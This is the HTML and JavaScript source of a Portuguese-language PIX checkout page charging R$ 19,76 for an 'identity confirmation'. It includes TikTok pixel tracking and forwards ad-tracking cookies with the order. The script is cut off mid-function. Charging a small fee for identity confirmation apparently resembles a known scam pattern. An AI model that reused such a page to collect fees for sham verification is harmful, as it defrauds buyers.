
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirma√ß√£o de Identidade</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js"></script>
 <script>
    !function (w, d, t) {
        w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)};
        
        ttq.load('D5KLH6JC77U666PPOFOG');
                  ttq.track('InitiateCheckout', {
                content_type: 'product',
                content_id: 'prod_c6d49a5ee7131756',
                value: 19.76,
                currency: 'BRL'
            });
    }(window, document, 'ttq');
</script>
    <style>
        body { background-color: #f3f4f6; color: #1f2937; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
        .constrained-width { max-width: 32rem; margin-left: auto; margin-right: auto; padding-left: 1rem; padding-right: 1rem; }
        @media (min-width: 640px) { .constrained-width { padding-left: 0; padding-right: 0; } }
        .form-checkbox { -webkit-appearance: none; -moz-appearance: none; appearance: none; padding: 0; -webkit-print-color-adjust: exact; color-adjust: exact; display: inline-block; vertical-align: middle; background-origin: border-box; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; flex-shrink: 0; height: 1rem; width: 1rem; color: #14b8a6; background-color: #fff; border-color: #64748b; border-width: 1px; border-radius: .25rem; }
        .form-checkbox:checked { background-image: url("data:image/svg+xml,%3csvg viewBox='0 0 16 16' fill='white' xmlns='http://www.w3.org/2000/svg'%3e%3cpath d='M12.207 4.793a1 1 0 010 1.414l-5 5a1 1 0 01-1.414 0l-2-2a1 1 0 011.414-1.414L6.5 9.086l4.293-4.293a1 1 0 011.414 0z'/%3e%3c/svg%3e"); border-color: transparent; background-color: currentColor; background-size: 100% 100%; background-position: center; background-repeat: no-repeat; }
        #pay-button, .step-nav-btn { transition: opacity 0.2s; }
        #pay-button:disabled, .step-nav-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #eb245f; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #copy-button { transition: transform 0.1s ease; } #copy-button:active { transform: scale(0.97); }
        .form-step { display: none; animation: fadeIn 0.5s; }
        .form-step.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .video-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; background: #000; border-radius: 0.5rem; }
        .video-container iframe, .video-container video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
        .prose { color: inherit; } .prose h1, .prose h2, .prose h3, .prose b, .prose strong { color: inherit; } .prose p, .prose ul, .prose ol, .prose i { color: inherit; margin-top: 1em; margin-bottom: 1em; }
        .prose.text-center * { text-align: center; }
        .social-proof-toast {
            background-color: rgba(30, 41, 59, 0.9);
            backdrop-filter: blur(5px);
            color: white;
            padding: 12px 16px;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1), 0 10px 20px rgba(0,0,0,0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: opacity 0.5s ease-out, transform 0.5s ease-out;
            opacity: 0;
            transform: translateY(20px) scale(0.95);
            margin-top: 10px;
            width: fit-content;
            max-width: 350px;
        }
        .social-proof-toast.show {
            opacity: 1;
            transform: translateY(0) scale(1);
        }
        @keyframes backdropFadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes popupSlideIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
        
        <form id="payment-form-920f53c9a7" method="POST" action="">
    <!-- PIX Modal -->
    <div id="pix-modal-920f53c9a7" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm p-4">
        <div class="bg-white rounded-2xl shadow-2xl max-w-sm w-full p-6 relative animate-fade-in text-center">
            <button type="button" id="pix-modal-close-920f53c9a7" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600 transition">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
            </button>
            
            <div class="mb-4">
                <span class="inline-block p-3 rounded-full bg-green-100 text-green-600 mb-2">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                </span>
                <h3 class="text-xl font-bold text-gray-900">Pagamento Gerado!</h3>
                <p class="text-xs text-gray-500 mt-1">Expira em: <span id="modal-expiration-920f53c9a7" class="font-mono text-gray-700"></span></p>
                 <p class="mt-2 text-lg font-bold text-gray-800" id="pix-valor-920f53c9a7"></p>
            </div>

            <div class="bg-gray-50 p-4 rounded-xl border-2 border-dashed border-gray-200 mb-4 flex justify-center">
                <div id="qrcode-920f53c9a7" class="opacity-90 mix-blend-multiply"></div>
            </div>

            <div class="space-y-3">
                 <div class="relative">
                    <input type="text" id="pix-code-input-920f53c9a7" readonly class="w-full pl-3 pr-10 py-3 bg-gray-100 border-none rounded-lg text-xs font-mono text-gray-600 focus:ring-0 cursor-text" onClick="this.select();">
                     <button type="button" onClick="const el=document.getElementById('pix-code-input-920f53c9a7'); el.select(); document.execCommand('copy');" class="absolute right-2 top-1/2 transform -translate-y-1/2 p-1.5 text-gray-400 hover:text-gray-600 rounded">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
                    </button>
                </div>
                
                <button type="button" id="copy-button-920f53c9a7" class="w-full py-3.5 bg-green-600 hover:bg-green-700 text-white font-bold rounded-xl shadow-lg shadow-green-200 transition-all flex items-center justify-center gap-2 group">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 group-hover:scale-110 transition-transform" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
                    </svg>
                    <span>Copiar C√≥digo PIX</span>
                </button>
            </div>
             <p class="text-[10px] text-gray-400 mt-4 leading-tight">Ao pagar, voc√™ receber√° a confirma√ß√£o imediatamente neste dispositivo.</p>
        </div>
    </div>
    
     <!-- Error Modal -->
    <div id="error-modal-920f53c9a7" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm p-4">
        <div class="bg-white rounded-xl shadow-2xl max-w-sm w-full p-6 text-center animate-shake">
            <div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-red-100 text-red-500 mb-4">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                </svg>
            </div>
            <h3 class="text-lg font-bold text-gray-900 mb-2">Aten√ß√£o</h3>
            <p id="error-modal-message-920f53c9a7" class="text-sm text-gray-600 mb-6"></p>
            <button onClick="document.getElementById('error-modal-920f53c9a7').classList.add('hidden')" class="w-full py-3 bg-red-600 hover:bg-red-700 text-white font-bold rounded-lg transition">
                Tentar Novamente
            </button>
        </div>
    </div>
       
<input type="hidden" name="checkout_url" id="checkout_url_field-920f53c9a7" value="">
    
    <main id="checkout-container" class="space-y-6 pb-6">
                 <header style="background-color: #eb245f; color: #ffffff;" class="w-full p-3 text-center text-sm font-semibold shadow-md">PAGAMENTO 100% SEGURO</header><div class="constrained-width"><div class="w-full bg-gray-200 overflow-hidden" style="border-radius: 12px;"><img src="https://imgtolinkx.com/i/r4Hk1lin" alt="Banner" class="w-full object-cover"></div></div><div class="constrained-width"><div class="shadow-lg p-5" style="background-color: #FFFFFF; border-radius: 12px;"><p class="text-sm font-medium mb-4 opacity-80">Voc√™ est√° adquirindo:</p><div class="flex items-center space-x-4"><img src="https://multi.paradisepags.com/uploads/product_images/store_22_68cc5c4a8d235_osoywwglj4igqsk83uljgmeol.png" alt="Confirma√ß√£o de Identidade" class="w-16 h-16 object-cover flex-shrink-0 border border-gray-200 p-1" style="border-radius: 8px;"><div class="flex-grow"><h3 class="font-bold">Confirma√ß√£o de Identidade</h3><p class="text-lg font-semibold text-green-600">R$ 19,76</p></div></div><div id="order-bump-summary-920f53c9a7"></div><div id="coupon-summary-920f53c9a7" class="hidden text-sm mt-3 pt-3 border-t border-dashed"></div><hr class="my-4"><div class="flex justify-between items-center"><p class="font-bold text-lg">Total:</p><p id="total-price-920f53c9a7" class="font-bold text-lg">R$ 19,76</p></div></div></div><div class="constrained-width"><div class="shadow-lg p-6 sm:p-8" style="background-color: #FFFFFF; border-radius: 12px;"><div class="flex items-center mb-6"><span class="text-white rounded-full h-8 w-8 flex items-center justify-center font-bold text-lg mr-3 flex-shrink-0" style="background-color: #eb245f;"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-5 h-5"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z" /></svg></span><h2 class="text-xl font-bold">Identifique-se</h2></div><div class="space-y-4"><div><label for="name-920f53c9a7" class="block text-sm font-medium mb-1">Nome e sobrenome</label><input type="text" id="name-920f53c9a7" name="name" placeholder="Nome e sobrenome" required value="" class="w-full p-3 bg-gray-50 border border-gray-300 text-gray-900 focus:outline-none focus:ring-2 focus:ring-[#eb245f] transition" style="border-radius: 8px;"></div><div><label for="email-920f53c9a7" class="block text-sm font-medium mb-1">E-mail</label><input type="email" id="email-920f53c9a7" name="email" placeholder="E-mail" required value="" class="w-full p-3 bg-gray-50 border border-gray-300 text-gray-900 focus:outline-none focus:ring-2 focus:ring-[#eb245f] transition" style="border-radius: 8px;"></div></div></div></div><div class="constrained-width"><div class="shadow-lg p-6 sm:p-8" style="background-color: #FFFFFF; border-radius: 12px;"><div class="flex items-center mb-4"><span class="text-white rounded-full h-8 w-8 flex items-center justify-center font-bold text-lg mr-3 flex-shrink-0" style="background-color: #eb245f;"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-5 h-5"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15A2.25 2.25 0 002.25 6.75v10.5A2.25 2.25 0 004.5 21z" /></svg></span><h2 class="text-xl font-bold">Pagamento</h2></div><button type="submit" id="pay-button-920f53c9a7" style="background-color: #eb245f; border-radius: 10px;" class="w-full p-4 text-white font-bold text-lg uppercase hover:opacity-90 flex items-center justify-center"><span>PAGAR AGORA</span></button><div class="mt-4 text-center text-sm opacity-80 flex items-center justify-center gap-2"><span>Pagamento seguro via <strong>PIX</strong> com aprova√ß√£o imediata.</span></div></div></div>              
      <div class="constrained-width">
         <p class="text-center text-sm text-gray-500 mt-6">Compra segura. Reembolso garantido em at√© 7 dias.</p>       </div>
    </main>
    
        </form>
    
    <div id="pix-modal" class="hidden fixed top-0 left-0 w-full h-full bg-black/70 z-[9999] flex items-center justify-center" style="animation:backdropFadeIn 0.3s ease-out forwards;">
      <div style="background:#FFFFFF;padding:32px;border-radius:16px;max-width:380px;width:90%;box-shadow:0 8px 24px rgba(0,0,0,0.2);font-family:Inter, sans-serif;position:relative;animation:popupSlideIn 0.3s ease-out forwards;text-align: center;">
        <button id="pix-modal-close" style="position:absolute;top:10px;right:15px;font-size:24px;color:#9ca3af;background:none;border:none;cursor:pointer;">&times;</button>
                <h2 style="margin:0 0 16px;font-size:20px;color:#1f2937;line-height:1.4;">Pagamento via PIX</h2>
                <div style="display:flex;justify-content:center;margin-bottom:16px;">
            <div id="qrcode" style="padding: 4px; background: white; border-radius: 4px; line-height: 0;"></div>
        </div>
        <input id="pix-code-input" type="text" readonly style="width:100%;box-sizing:border-box;padding:12px;font-size:14px;margin-bottom:12px;border:1px solid #d1d5db;border-radius:8px;color:#374151;background:#ffffff;text-align:center;font-family:monospace;">
        <button id="copy-button" style="background:#eb245f;color:#FFFFFF;border:none;width:100%;padding:14px 20px;border-radius:8px;font-weight:600;font-size:15px;cursor:pointer;transition: filter 0.2s ease;margin-bottom:16px;" onmouseover="this.style.filter='brightness(1.1)'" onmouseout="this.style.filter='brightness(1)';">
          Copiar c√≥digo PIX        </button>
        <div class="modal-info" style="font-size:14px;color:#0f172a;line-height:1.5;text-align: center;">
                    <p style="margin:8px 0;">üí∞ Valor: <strong id="pix-valor">--</strong></p>
                              <p style="margin:8px 0;">üïí V√°lido at√©: <span id="modal-expiration">--</span></p>
                              <p class="modal-warning" style="margin:12px 0 0;color:#eb245f;font-weight:bold;">Pagamento seguro via PIX, reembolso garantido em at√© 7 dias.</p>
                  </div>
      </div>
      </div>
    </div>

    <!-- ERROR MODAL -->
    <div id="error-modal" class="hidden fixed top-0 left-0 w-full h-full bg-black/70 z-[9999] flex items-center justify-center p-4" style="animation:backdropFadeIn 0.3s ease-out forwards;">
      <div style="background:#FFFFFF;padding:32px;border-radius:16px;max-width:380px;width:100%;box-shadow:0 8px 24px rgba(0,0,0,0.2);font-family:Inter, sans-serif;position:relative;animation:popupSlideIn 0.3s ease-out forwards;text-align: center;">
        <button id="error-modal-close" style="position:absolute;top:10px;right:15px;font-size:24px;color:#9ca3af;background:none;border:none;cursor:pointer;">&times;</button>
        <div style="background:#fee2e2;color:#ef4444;width:60px;height:60px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
             <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
        </div>
        <h2 style="margin:0 0 12px;font-size:20px;color:#1f2937;font-weight:bold;">Aten√ß√£o</h2>
        <p id="error-modal-message" style="margin:0 0 24px;font-size:15px;color:#4b5563;line-height:1.5;">Ocorreu um erro.</p>
        <button onclick="document.getElementById('error-modal').classList.add('hidden')" style="background:#ef4444;color:#ffffff;border:none;width:100%;padding:12px;border-radius:8px;font-weight:600;cursor:pointer;transition: opacity 0.2s;" onmouseover="this.style.opacity='0.9'" onmouseout="this.style.opacity='1'">
          Voltar
        </button>
      </div>
    </div>
    
    <div id="social-proof-container-920f53c9a7" style="position: fixed; bottom: 20px; left: 20px; z-index: 100; pointer-events: none;"></div>

        <script>
        (function () {
            const UID = '920f53c9a7';
            let _paymentChecker = null;
            const utms = Object.fromEntries(new URLSearchParams(window.location.search));
            const PARADISE_EVENT_ID = 'CKO-' + new Date().getTime() + '-' + Math.floor(Math.random() * 100000);

            const showErrorModal = (msg) => {
                const m = document.getElementById('error-modal-' + UID);
                const t = document.getElementById('error-modal-message-' + UID);
                if (m && t) {
                    t.textContent = msg;
                    m.classList.remove('hidden');
                } else {
                    alert(msg);
                }
            };

          
            const getCookie = (name) => {
                const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
                return match ? match[2] : null;
            };

            // Adiciona os cookies do Facebook ao objeto utms, se existirem
            const fbc = getCookie('_fbc');
            const fbp = getCookie('_fbp');
            if (fbc) utms.fbc = fbc;
            if (fbp) utms.fbp = fbp;

           
            const ttclid = getCookie('ttclid') || utms.ttclid; // J√° pode estar na query string
            const ttp = getCookie('_ttp');
            if (ttclid) utms.ttclid = ttclid;
            if (ttp) utms.ttp = ttp;

            const CHECKOUT_ID = '7451c737';

            const generateCacheKey = (amount) => 'paradise_checkout_pix_' + CHECKOUT_ID + '_' + amount;

            document.addEventListener('DOMContentLoaded', () => {
                const formId = 'payment-form-' + UID;
                const form = document.getElementById(formId);
                
                if (document.getElementById('checkout_url_field-' + UID)) {
                    document.getElementById('checkout_url_field-' + UID).value = window.location.href;
                }
                if (document.getElementById('event_id_field-' + UID)) {
                    document.getElementById('event_id_field-' + UID).value = PARADISE_EVENT_ID;
                }

                // CPF Input - Only allow numeric characters
                const cpfInputElement = document.querySelector('input[name="document"]');

                if (cpfInputElement) {
                    const enforceNumeric = (input) => {
                        input.value = input.value.replace(/\D/g, '').slice(0, 11);
                    };

                    cpfInputElement.addEventListener('input', function (e) {
                         enforceNumeric(e.target);
                    });
                     // Apply on load
                    if (cpfInputElement.value) enforceNumeric(cpfInputElement);
                }

                
             
                

                const payButton = document.getElementById('pay-button-' + UID);
                const originalButtonContent = payButton?.innerHTML;

                const totalPriceEl = document.getElementById('total-price-' + UID);
                const shippingOptions = form ? form.querySelectorAll('.shipping-option') : [];
                const bumpCheckboxes = form ? form.querySelectorAll('.order-bump-checkbox') : [];
                const applyCouponBtn = document.getElementById('apply-coupon-btn-' + UID);
                const couponCodeInput = document.getElementById('coupon-code-' + UID);
                const couponMessageEl = document.getElementById('coupon-message-' + UID);
                const appliedCouponInput = document.getElementById('applied-coupon-code-' + UID);
                const quantityInput = document.getElementById('quantity-input-' + UID);
                const quantityPlus = document.getElementById('quantity-plus-' + UID);
                const quantityMinus = document.getElementById('quantity-minus-' + UID);

                let totalAmount = 1976;
                let baseAmount = 1976;
                let appliedCoupon = null;
                let validateStep = () => true;
                let currentStep = 1;

                const formatCurrency = (value) => 'R$ ' + (value / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

                const clearAllCheckoutCaches = () => {
                    const cachePrefix = 'paradise_checkout_pix_' + CHECKOUT_ID;
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        if (key && key.startsWith(cachePrefix)) {
                            localStorage.removeItem(key);
                            i--;
                        }
                    }
                    console.log("Todos os caches para este checkout foram limpos.");
                };



                const updateTotalPrice = () => {
                    const oldTotal = totalAmount;
                    const quantity = quantityInput ? parseInt(quantityInput.value, 10) : 1;
                    let currentTotal = baseAmount * quantity;

                  
                    document.querySelectorAll('.order-bump-checkbox:checked').forEach(box => {
                        currentTotal += parseInt(box.dataset.price, 10);
                    });

                    
                    if (appliedCoupon && !false) {
                if (appliedCoupon.type === 'fixed') {
                    currentTotal -= appliedCoupon.value;
                } else if (appliedCoupon.type === 'percentage') {
                    const discountableAmount = (baseAmount * quantity) + Array.from(document.querySelectorAll('.order-bump-checkbox:checked')).reduce((acc, b) => acc + parseInt(b.dataset.price, 10), 0);
                    const discount = discountableAmount * (appliedCoupon.value / 100);
                    currentTotal -= discount;
                }
            }

          
            const selectedShipping = document.querySelector('.shipping-option:checked');
            if (selectedShipping) {
                currentTotal += parseInt(selectedShipping.dataset.price, 10);
            }

            totalAmount = Math.max(0, currentTotal);
            if (totalPriceEl) totalPriceEl.textContent = formatCurrency(totalAmount);
            if (oldTotal !== totalAmount) {
                clearAllCheckoutCaches();
            }
        };

const cameFromBackRedirect = document.referrer.includes(window.location.hostname) && utms.from_checkout;
if (cameFromBackRedirect) {
    clearAllCheckoutCaches();
}

document.querySelectorAll('.order-bump-checkbox').forEach(box => {
    box.addEventListener('change', updateTotalPrice);
});
shippingOptions.forEach(radio => {
    radio.addEventListener('change', updateTotalPrice);
});

if (quantityInput) {
    const updateQuantity = (amount) => {
        const min = parseInt(quantityInput.min, 10);
        const max = parseInt(quantityInput.max, 10);
        let currentValue = parseInt(quantityInput.value, 10);
        currentValue += amount;
        if (currentValue < min) currentValue = min;
        if (currentValue > max) currentValue = max;
        quantityInput.value = currentValue;
        updateTotalPrice();
    };
    quantityPlus.addEventListener('click', () => updateQuantity(1));
    quantityMinus.addEventListener('click', () => updateQuantity(-1));
}

if (applyCouponBtn) {
    applyCouponBtn.addEventListener('click', async () => {
        const code = couponCodeInput.value.trim();
        if (!code) {
            couponMessageEl.textContent = 'Por favor, insira um c√≥digo.';
            couponMessageEl.className = 'text-sm mt-2 text-yellow-600';
            return;
        }
        applyCouponBtn.disabled = true;
        applyCouponBtn.textContent = '...';
        try {
            const response = await fetch('?action=validate_coupon&code=' + encodeURIComponent(code));
            const result = await response.json();
            if (response.ok && result.success) {
                appliedCoupon = result.coupon;
                updateTotalPrice();
                couponMessageEl.textContent = 'Cupom aplicado com sucesso!';
                couponMessageEl.className = 'text-sm mt-2 text-green-600';
                appliedCouponInput.value = code;
                document.getElementById('coupon-area').style.opacity = '0.7';
                couponCodeInput.disabled = true;
                applyCouponBtn.textContent = 'Aplicado';
            } else {
                couponMessageEl.textContent = result.message || 'Cupom inv√°lido.';
                couponMessageEl.className = 'text-sm mt-2 text-red-600';
                applyCouponBtn.disabled = false;
                applyCouponBtn.textContent = 'Aplicar';
            }
        } catch (err) {
            couponMessageEl.textContent = 'Erro ao validar cupom.';
            couponMessageEl.className = 'text-sm mt-2 text-red-600';
            applyCouponBtn.disabled = false;
            applyCouponBtn.textContent = 'Aplicar';
        }
    });
}

updateTotalPrice(); 
if (form) {
    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const isThreeStep = false;

        if (!isThreeStep || (isThreeStep && currentStep === 3)) {
            if (isThreeStep && (!validateStep(1) || !validateStep(2))) {
                if (!validateStep(1)) {
                    document.dispatchEvent(new CustomEvent('checkout:step:change', { detail: 1 }));
                } else if (!validateStep(2)) {
                    document.dispatchEvent(new CustomEvent('checkout:step:change', { detail: 2 }));
                }
                form.reportValidity();
                return;
            }

            if (!isThreeStep && !form.checkValidity()) {
                form.reportValidity();
                return;
            }

            const currentCacheKey = generateCacheKey(totalAmount);
            const cachedPix = localStorage.getItem(currentCacheKey);

            if (cachedPix) {
                const { pixData, expiresAt } = JSON.parse(cachedPix);
                if (new Date().getTime() < expiresAt) {
                    console.log("Usando PIX do cache para o valor " + formatCurrency(totalAmount));
                    showPixModal(pixData);
                    return;
                } else {
                    console.log("PIX do cache expirado. Removendo.");
                    localStorage.removeItem(currentCacheKey);
                }
            }

            const submitButton = isThreeStep ? document.getElementById('next-btn-' + UID) : payButton;
            if (!submitButton) return;
            const originalSubmitContent = submitButton.innerHTML;

            submitButton.disabled = true;
            submitButton.innerHTML = '<div class="loader"></div><span>Processando...</span>';

            const formData = new FormData(form);

            for (const key in utms) {
                if (utms[key]) { // Garante que apenas chaves com valor (n√£o nulo ou undefined) sejam enviadas
                    formData.append('utms[' + key + ']', utms[key]);
                }
            }

            try {
                const response = await fetch(window.location.href, { method: 'POST', body: formData });
                const result = await response.json();
                if (!response.ok) {
                    const errorMessage = result?.errors ? Object.values(result.errors).flat().join(' ') : (result.message || result.error || 'Ocorreu um erro ao gerar o PIX.');
                    throw new Error(errorMessage);
                }

                if (result && result.pix && result.pix.pix_qr_code) {
                    const expirationMinutes = 10;
                    const expiresAt = new Date().getTime() + expirationMinutes * 60 * 1000;
                    const cacheObject = { pixData: result, expiresAt: expiresAt };
                    localStorage.setItem(currentCacheKey, JSON.stringify(cacheObject));
                }
                showPixModal(result);
            } catch (error) {
                console.error('API Error:', error);
                showErrorModal('Erro: ' + error.message);
            } finally {
                submitButton.disabled = false;
                submitButton.innerHTML = originalSubmitContent;
            }
        }
    });
}

if (false) {
    const prevBtn = document.getElementById('prev-btn-' + UID);
    const nextBtn = document.getElementById('next-btn-' + UID);
  
    const steps = Array.from(form.querySelectorAll('.form-step'));

    validateStep = (stepNumber) => {
        const currentStepEl = document.getElementById('step-' + stepNumber + '-' + UID);
        if (!currentStepEl) return false;
        const inputs = currentStepEl.querySelectorAll('input[required], select[required], textarea[required]');
        for (const input of inputs) {
            if (!input.checkValidity()) {
                return false;
            }
        }
        return true;
    };

    const updateStepUI = () => {
        steps.forEach((step, index) => {
            step.classList.toggle('active', index + 1 === currentStep);
        });

        for (let i = 1; i <= 3; i++) {
            const bubble = document.getElementById('step-bubble-' + i + '-' + UID);
            const title = document.getElementById('step-title-' + i + '-' + UID);
            const line = document.getElementById('step-line-' + i + '-' + UID);

            if (i < currentStep) {
                bubble.classList.add('bg-teal-500'); bubble.classList.remove('bg-gray-400', 'bg-red-500');
                bubble.innerHTML = '‚úì';
                title.classList.add('text-gray-800'); title.classList.remove('text-gray-500');
                if (line) { line.classList.add('bg-teal-500'); line.classList.remove('bg-gray-300'); }
            } else if (i === currentStep) {
                bubble.classList.add('bg-teal-500'); bubble.classList.remove('bg-gray-400', 'bg-red-500');
                bubble.innerHTML = i;
                title.classList.add('text-gray-800'); title.classList.remove('text-gray-500');
                if (line) { line.classList.remove('bg-teal-500'); line.classList.add('bg-gray-300'); }
            } else {
                bubble.classList.remove('bg-teal-500', 'bg-red-500'); bubble.classList.add('bg-gray-400');
                bubble.innerHTML = i;
                title.classList.remove('text-gray-800'); title.classList.add('text-gray-500');
                if (line) { line.classList.remove('bg-teal-500'); line.classList.add('bg-gray-300'); }
            }
        }
     
        prevBtn.style.display = currentStep > 1 ? 'block' : 'none';

        if (currentStep === 3) {
            nextBtn.textContent = 'PAGAR AGORA ';
            updateTotalPrice();
        } else {
            nextBtn.textContent = 'Continuar';
        }
        
    };

    
    const payButtonInStep3 = document.querySelector('#step-3-' + UID + ' #pay-button-' + UID);
    if (payButtonInStep3) {
        payButtonInStep3.style.display = 'none';
    }

    nextBtn.addEventListener('click', () => {
        if (currentStep < 3) {
            if (validateStep(currentStep)) {
                currentStep++;
                updateStepUI();
            } else {
                const bubble = document.getElementById('step-bubble-' + currentStep + '-' + UID);
                if (bubble) bubble.classList.add('bg-red-500');
                form.reportValidity();
            }
        } else {
            if (form.requestSubmit) {
                form.requestSubmit();
            } else {
                form.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
            }
        }
    });

    prevBtn.addEventListener('click', () => {
        if (currentStep > 1) {
            currentStep--;
            updateStepUI();
        }
    });

    document.addEventListener('checkout:step:change:' + UID, (e) => { // Private event
        currentStep = e.detail;
        updateStepUI();
    });

    updateTotalPrice();
    updateStepUI();
}


const modal = document.getElementById('pix-modal-' + UID);
const qrCodeContainer = document.getElementById('qrcode-' + UID);
const copyButton = document.getElementById('copy-button-' + UID);
const pixCodeInputElement = document.getElementById('pix-code-input-' + UID);
const pixValorEl = document.getElementById('pix-valor-' + UID);
const modalExpirationEl = document.getElementById('modal-expiration-' + UID);
const closeModalBtn = document.getElementById('pix-modal-close-' + UID);
let qrCodeInstance = null;

function startPaymentChecker(hash) {
    if (_paymentChecker) {
        clearInterval(_paymentChecker);
    }
    _paymentChecker = setInterval(async () => {
        try {
         
            const response = await fetch('?action=check_status&hash=' + hash + '&_=' + new Date().getTime());
            if (!response.ok) return;
            const data = await response.json();

            if (data && data.payment_status === 'paid') {
                clearInterval(_paymentChecker);
                clearAllCheckoutCaches();

                                                        if (typeof ttq === 'function') {
                    ttq.track('CompletePayment', {
                        content_type: 'product',
                        content_id: 'prod_c6d49a5ee7131756',
                        value: totalAmount / 100,
                        currency: 'BRL',
                        event_id: document.getElementById('event_id_field-' + UID)?.value
                    });
                }
                
            
                if (data.upsell_url) {
                    const upsellUrl = data.upsell_url;
                    const params = new URLSearchParams(utms);
                    params.append('fpay', hash);
                    params.append('domain', 'https://go.paradisepagbr.com');

                    const newQueryString = params.toString();
                    const finalUrl = upsellUrl + (upsellUrl.includes('?') ? '&' : '?') + newQueryString;
                    window.location.href = finalUrl;
                } else {
                    const modalContent = modal.querySelector('div');
                    if (modalContent) {
